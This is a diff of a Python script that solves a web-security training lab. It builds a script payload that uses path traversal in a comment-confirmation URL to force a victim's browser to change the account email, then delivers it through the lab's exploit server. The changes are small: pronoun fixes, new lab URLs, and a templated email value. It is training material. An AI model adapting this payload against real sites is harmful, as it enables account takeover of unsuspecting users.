@@ -10,7 +10,7 @@
 #           in order to redirect the victim to their profile and change their email using
 #           URL parameters
 #        2. Deliver the exploit to the victim
-#        3. The victim's email will be changed after he trigger the exploit
+#        3. The victim's email will be changed after they trigger the exploit
 #
 ##################################################################################################
 
@@ -26,10 +26,10 @@ from colorama import Fore
 #########
 
 # change this to your lab URL
-lab_url = "https://0a91002303fb116b8046e93d00d5000e.web-security-academy.net"
+lab_url = "https://0afd007c04580a1280073f6100ac0054.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a430021034f11ec8008e879019b0041.exploit-server.net"
+exploit_server_url = "https://exploit-0a26004104690a9880243e94017f0079.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
@@ -40,7 +40,7 @@ new_email = "hacked@you.com"
 
 # payload to change the victim's email
 payload = f"""<script>
-                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail=hacked%40you.com%26submit=1"
+                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail={new_email}%26submit=1"
             </script>"""
 
 # data to send via POST
@@ -61,7 +61,7 @@ except:
     exit(1)
 
 print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
-print(Fore.WHITE + "🗹 The victim's email will be changed after he trigger the exploit") 
+print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
 print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 
 
